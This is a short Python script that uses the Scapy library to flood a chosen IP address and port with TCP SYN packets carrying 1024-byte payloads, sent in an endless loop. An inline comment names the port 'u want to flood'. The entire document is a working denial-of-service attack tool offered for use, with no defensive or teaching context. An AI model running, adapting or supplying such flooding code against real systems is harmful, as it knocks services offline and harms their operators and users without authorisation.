from scapy.all import *
target_ip = "172.0.0.1"
# the target port u want to flood
target_port = 2000
ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)